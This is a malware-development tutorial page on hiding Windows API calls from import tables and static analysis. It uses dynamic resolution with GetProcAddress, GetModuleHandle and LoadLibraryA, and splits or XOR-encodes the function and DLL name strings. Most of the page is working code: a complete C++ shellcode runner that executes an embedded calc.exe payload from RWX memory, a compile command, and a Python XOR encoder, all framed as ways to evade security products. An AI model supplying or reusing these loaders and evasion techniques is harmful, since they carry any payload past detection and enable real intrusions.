# ⚪ Function Call Obfuscation

## <mark style="color:red;">Dynamic Function Call</mark>&#x20;

### <mark style="color:orange;">`GetProcAddress`</mark> <mark style="color:orange;"></mark><mark style="color:orange;">&</mark> <mark style="color:orange;"></mark><mark style="color:orange;">`GetModuleHandle`</mark>

In malware development, `GetProcAddress` and `GetModuleHandle` are two Windows API functions often used to dynamically resolve and call functions from external libraries or modules. While these functions are legitimate and serve important purposes in legitimate software, malware authors use them for malicious activities to hide their intentions and evade detection. Here's how these functions are typically employed:

* <mark style="color:green;">**GetProcAddress**</mark><mark style="color:green;">:</mark>
  * <mark style="color:blue;">**Purpose**</mark><mark style="color:blue;">:</mark> `GetProcAddress` is used to retrieve the address of an exported function or variable from a dynamic-link library (DLL) or executable module. It is a fundamental part of the Windows API for dynamic linking.
  * <mark style="color:red;">**Malicious Use**</mark><mark style="color:red;">:</mark>
    * Malware often uses `GetProcAddress` to dynamically load functions or extract function addresses from system DLLs or other loaded modules. This allows the malware to execute specific tasks without statically linking against the libraries or using fixed function names.
    * Malicious code may look for functions such as `LoadLibraryA` (or `LoadLibraryW` for Unicode), `GetProcAddress`, or `VirtualAlloc` to load additional malicious modules or allocate memory for shellcode.
* <mark style="color:green;">**GetModuleHandle**</mark><mark style="color:green;">:</mark>
  * <mark style="color:blue;">**Purpose**</mark><mark style="color:blue;">:</mark> `GetModuleHandle` retrieves a handle to a loaded module, such as a DLL or executable file. It is used to obtain a module's base address, which can be used with `GetProcAddress` to resolve function addresses.
  * <mark style="color:red;">**Malicious Use**</mark><mark style="color:red;">:</mark>
    * Malware may use `GetModuleHandle` to obtain handles to specific system modules or to its own loaded modules. This is done to locate and call functions within these modules without relying on hardcoded addresses.
    * For evasion purposes, malware may also use `GetModuleHandle` to verify whether certain system modules are already loaded in memory. If not, it may load them to blend in with legitimate processes.



#### What happens when we use `GetProcAddress` and `GetModuleHandle` in our malware is that the libraries and functions that we are using in the code are not statically linked to the PE file. the compile will not include them in the program at compile time so the binary size is reduced and security products won't see the functions being imported in the IAT (import address table) of our binary.

Here is an example of a simple shellcode runner that is using static API calls:

<figure><img src="../../.gitbook/assets/image (340).png" alt=""><figcaption></figcaption></figure>

as you can see, there are multiple API functions that are directly used in the code:

* `VirtualAlloc`
* `VirtualProtect`
* `RtlMoveMemory`
* `CreateThread`
* `WaitForSingleObject`

if we look at the IAT, we can clearly see these imports in the PE:

```
dumpbin /imports project1.exe
```

<figure><img src="../../.gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>

and in PEStudio, this is what the security product or malware analyst will see during static analysis:

<figure><img src="../../.gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>

as you can see, some functions such as `VirtualProtect` are even marked as "blacklist" API calls.&#x20;

we start with `VirtualProtect` as an example. the process is like this:

1. find the declaration and dependencies of target function using MSDN documentation
2. define a function pointer with the same structure to store the address of target function
3. get the address of target function using `GetProcAddress` and the library name using `GetModuleHandle`
4. use the function pointer to call the original function and pass the parameters



The MSDN documents shows the structure of `VirtualProtect` function:

&#x20;

<figure><img src="../../.gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>

```cpp
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```

and the function is defined in the `kernel32.dll` library:

<figure><img src="../../.gitbook/assets/image (345).png" alt=""><figcaption></figcaption></figure>

this is how the final code looks like:

{% code title="project1.cpp" %}
```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// raw calc shellcode
const unsigned char shellcode[] = {
0xFC,0x48,0x83,0xE4,0xF0,0xE8,0xC0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xD2,0x65,0x48,0x8B
,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,0x48,
0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xED,0x52,0x41,0x51,0x48,0x8B,
0x52,0x20,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xC0,0x74,0x67,0x48,0x01,0xD0,0x50,
0x8B,0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,0x01,0xD6,0x4D,
0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0x38,0xE0,0x75,0xF1,0x4C,0x03,0x4C,0x24,0x08,0x45,
0x39,0xD1,0x75,0xD8,0x58,0x44,0x8B,0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,
0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41,0x58,0x41,0x58,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,0x41,0x5A,0x48,0x83,
0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,0x59,0x5A,0x48,0x8B,0x12,0xE9,0x57,0xFF,0xFF,0xFF,0x5D,0x48,0xBA,0x01,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8D,0x8D,0x01,0x01,0x00,0x00,0x41,0xBA,0x31,0x8B,0x6F,0x87,0xFF,0xD5,0xBB,0xF0,
0xB5,0xA2,0x56,0x41,0xBA,0xA6,0x95,0xBD,0x9D,0xFF,0xD5,0x48,0x83,0xC4,0x28,0x3C,0x06,0x7C,0x0A,0x80,0xFB,0xE0,0x75,
0x05,0xBB,0x47,0x13,0x72,0x6F,0x6A,0x00,0x59,0x41,0x89,0xDA,0xFF,0xD5,0x63,0x61,0x6C,0x63,0x2E,0x65,0x78,0x65,0x00 };

// size of shellcode
unsigned int shellcode_len = sizeof(shellcode);

// function pointer for VirtualProtect dynamic call
BOOL(WINAPI  *HideProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);

int main() {
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // Allocate memory for shellcode in current process address space
    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy shellcode to allocated memory
    RtlMoveMemory(exec_mem, shellcode, shellcode_len);

    // point to the address of VirtualProtect
    HideProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");

    // call VirtualProtect with HideProtect
    rv = HideProtect(exec_mem, shellcode_len, PAGE_EXECUTE_READ, &oldprotect);

    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    WaitForSingleObject(th, -1);
    return 0;
}
```
{% endcode %}

compile:

{% code title="compile.bat" %}
```batch
@ECHO OFF
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcproject1.cpp /link /OUT:project1.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```
{% endcode %}

now lets check the IAT to see if `VirtualProtect` is there:

```batch
dumpbin /imports project1.exe | findstr VirtualProtect
```

<figure><img src="../../.gitbook/assets/image (348).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>

and indeed it is not there :)

{% hint style="success" %}
The same process can be repeated for all other function calls used in the code such as `VirtualAlloc,` `CreateThread`, `RtlMoveMemory` and so on.
{% endhint %}

***

### <mark style="color:orange;">`GetProcAddress`</mark> <mark style="color:orange;"></mark><mark style="color:orange;">&</mark> <mark style="color:orange;"></mark><mark style="color:orange;">`LoadLibraryA`</mark>

An alternative for combining `GetProcAddress` with `GetModuleHandle`, is loading the corresponding library with `LoadLibraryA`, and then resolving the function’s address with GetProcAddress.

example (before obfuscation):

```cpp
#include <windows.h>
// simple windows message box API function
int main(int argc, char** argv) { 
    MessageBox(NULL, "Test", "Something", MB_OK);
    return 0;
}
```

if we compile and check the imports:

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

like the previous example with `GetProcAddress` and `GetModuleHandle`, we can hide this function import.&#x20;

First, it is necessary to define a function pointer for the API `MessageBoxA`. then, we need the prototype of `MessageBox`, which can be copy-pasted from `winuser.h` from the Windows SDK or straight from MSDN:

<pre class="language-cpp"><code class="lang-cpp"><strong>int MessageBox(
</strong>  HWND    hWnd,
  LPCTSTR lpText,
  LPCTSTR lpCaption,
  UINT    uType
);
</code></pre>

Now, the aforementioned function pointer syntax can be updated with the correct information:

```cpp
int (*_MessageBoxA)(
    HWND hWnd,
    LPCTSTR lpText,
    LPCTSTR lpCaption,
    UINT uType
);
```

MSDN tells us that this function is exported by `User32.dll`

So, the application must first load this library. Then, `GetProcAddress` can finally be used to assign the correct address to the function pointer, from there, the original example must be adapted to call `fMessageBoxA` instead of `MessageBoxA`, which gives:

```cpp
#include <windows.h>

typedef int (*_MessageBoxA)(
  HWND    hWnd,
  LPCTSTR lpText,
  LPCTSTR lpCaption,
  UINT    uType
);

int main(int argc, char** argv) {

    HANDLE hUser32 = LoadLibraryA("User32.dll");
    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, "MessageBoxA");
    fMessageBoxA(NULL, "Test", "Something", MB_OK);
    return 0;
```

{% hint style="info" %}
The `Windows.h` include is only required for the data types `HWND`, `LPCTSTR` and `UINT`. Building and running this simple example spawns an alert box, as expected.
{% endhint %}

***



## <mark style="color:red;">Function Name Obfuscation</mark>

Following the previous examples, we where able to hide the static function call. but  if we take a look at the printable strings in the PE file:



<figure><img src="../../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

#### we can see the function name string is visible. this can be even more suspicious than the direct function call itself !!!

#### so what can we do? we can simply obfuscate the string by:

* splitting the function name string in multiple parts  and concatenating at run time
* encoding the function name and decoding at run time&#x20;
* encrypting the function name and decrypting at run time



### <mark style="color:orange;">Splitting the strings</mark>

#### here is an example of splitting the function and dll name string and then putting it back together:

```cpp
char dll_name[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
char function_name[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0};

//printf("%s\n",dll_name);
//printf("%s\n",function_name);
HideProtect = GetProcAddress(GetModuleHandle(dll_name), function_name);
```

{% hint style="warning" %}
Mind the '0' at the end of string, that's a string delimiter and its necessary.
{% endhint %}



### <mark style="color:orange;">Encrypting the strings</mark>

Another solution is to encrypt/encode the function/dll name string and then decrypt/decode it at run time:

{% code title="xor.py" %}
```python
import sys

try:
        plaintext = str(sys.argv[1])
        KEY = str(sys.argv[2])
except:
        print("\nXOR the given string with given key")
        print("\nusage : %s [string] [key]\n" % sys.argv[0])
        sys.exit(1)

def xor(data, key):
        l = len(key)
        output_str = ""
        for i in range(len(data)):
                current = data[i]
                current_key = key[i%len(key)]
                output_str += chr(ord(current) ^ ord(current_key))
        return output_str

def printC(ciphertext):
        print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

ciphertext = xor(plaintext, KEY)
printC(ciphertext)


```
{% endcode %}

```bash
╭─root@w4lk3r ~ 
╰─# python xor.py kernel32.dll RHRHSDHSFR 
{ 0x39, 0x2d, 0x20, 0x26, 0x36, 0x28, 0x7b, 0x61, 0x68, 0x36, 0x3e, 0x24 };
╭─root@w4lk3r ~ 
╰─# python xor.py VirtualProtect RHRHSDHSFR
{ 0x4, 0x21, 0x20, 0x3c, 0x26, 0x25, 0x24, 0x3, 0x34, 0x3d, 0x26, 0x2d, 0x31, 0x3c };
```

this will print the XORed string in C style shellcode format. we implement a XOR decryption stub in the C dropper and replace the strings:

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

const unsigned char shellcode[] = {
0xFC,0x48,0x83,0xE4,0xF0,0xE8,0xC0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xD2,0x65,0x48,0x8B
,0x52,0x60,0x48,0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x72,0x50,0x48,0x0F,0xB7,0x4A,0x4A,0x4D,0x31,0xC9,0x48,
0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xED,0x52,0x41,0x51,0x48,0x8B,
0x52,0x20,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xC0,0x74,0x67,0x48,0x01,0xD0,0x50,
0x8B,0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0xE3,0x56,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,0x48,0x01,0xD6,0x4D,
0x31,0xC9,0x48,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x41,0x01,0xC1,0x38,0xE0,0x75,0xF1,0x4C,0x03,0x4C,0x24,0x08,0x45,
0x39,0xD1,0x75,0xD8,0x58,0x44,0x8B,0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,
0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41,0x58,0x41,0x58,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,0x41,0x5A,0x48,0x83,
0xEC,0x20,0x41,0x52,0xFF,0xE0,0x58,0x41,0x59,0x5A,0x48,0x8B,0x12,0xE9,0x57,0xFF,0xFF,0xFF,0x5D,0x48,0xBA,0x01,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8D,0x8D,0x01,0x01,0x00,0x00,0x41,0xBA,0x31,0x8B,0x6F,0x87,0xFF,0xD5,0xBB,0xF0,
0xB5,0xA2,0x56,0x41,0xBA,0xA6,0x95,0xBD,0x9D,0xFF,0xD5,0x48,0x83,0xC4,0x28,0x3C,0x06,0x7C,0x0A,0x80,0xFB,0xE0,0x75,
0x05,0xBB,0x47,0x13,0x72,0x6F,0x6A,0x00,0x59,0x41,0x89,0xDA,0xFF,0xD5,0x63,0x61,0x6C,0x63,0x2E,0x65,0x78,0x65,0x00 };

unsigned int shellcode_len = sizeof(shellcode);

BOOL(WINAPI  *HideProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);


// XOR decryption stub
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}



int main() {
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // XOR decrypt key
	char key[] = "RHRHSDHSFR";

	// the XOR string for obfuscated function name
	char function_name[]={0x4, 0x21, 0x20, 0x3c, 0x26, 0x25, 0x24, 0x3, 0x34, 0x3d, 0x26, 0x2d, 0x31, 0x3c,0x00};
	char dll_name[]={0x39, 0x2d, 0x20, 0x26, 0x36, 0x28, 0x7b, 0x61, 0x68, 0x36, 0x3e, 0x24,0x00 };

    // Allocate memory for shellcode in current process address space
    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy shellcode to allocated memory
    RtlMoveMemory(exec_mem, shellcode, shellcode_len);

    // decrypt function and dll name
    XOR((char *) function_name, strlen(function_name), key, sizeof(key));
    XOR((char *) dll_name, strlen(dll_name), key, sizeof(key));
    //printf("%s\n",function_name);
    //printf("%s",dll_name);
    
    // point to the address of VirtualProtect
    HideProtect = GetProcAddress(GetModuleHandle(dll_name), function_name);


    // call VirtualProtect with HideProtect
    rv = HideProtect(exec_mem, shellcode_len, PAGE_EXECUTE_READ, &oldprotect);

    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    WaitForSingleObject(th, -1);
    return 0;
}
```

{% hint style="warning" %}
Remember to add string terminator bytes at the end of XORed array (0x00), otherwise the DLL and function name will not be loaded correctly.
{% endhint %}
